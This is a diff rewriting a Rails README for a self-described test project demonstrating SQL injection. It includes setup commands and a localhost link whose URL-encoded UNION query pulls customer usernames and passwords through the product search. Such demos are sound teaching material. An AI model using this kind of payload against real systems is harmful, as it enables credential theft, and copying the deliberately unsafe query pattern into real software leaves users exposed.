@@ -1,24 +1,21 @@
 # README
 
-This README would normally document whatever steps are necessary to get the
-application up and running.
+Just a dumb test project and a super simplistic proof of concept for SQL injection 
 
-Things you may want to cover:
+```bash
+bundle install
+rails db:setup
+```
 
-* Ruby version
+Then create some stuff in the db so you can play around with it
+```ruby
+FactoryBot.create_list :product, 20
+FactoryBot.create_list, :customer, 10
+```
 
-* System dependencies
+[http://localhost:3007/products](http://localhost:3007/products)
 
-* Configuration
+[Example of unsafe query](http://localhost:3007/products?query=%27%29+UNION+select+customers.id%2C++customers.first_name+AS+name%2C+customers.username+AS+cost%2C+customers.password+AS+description%2C+customers.created_at%2C+customers.updated_at+FROM+customers+--&commit=Search)
 
-* Database creation
 
-* Database initialization
-
-* How to run the test suite
-
-* Services (job queues, cache servers, search engines, etc.)
-
-* Deployment instructions
-
-* ...
+**TODO:** Actually do stuff with hotwire too. 
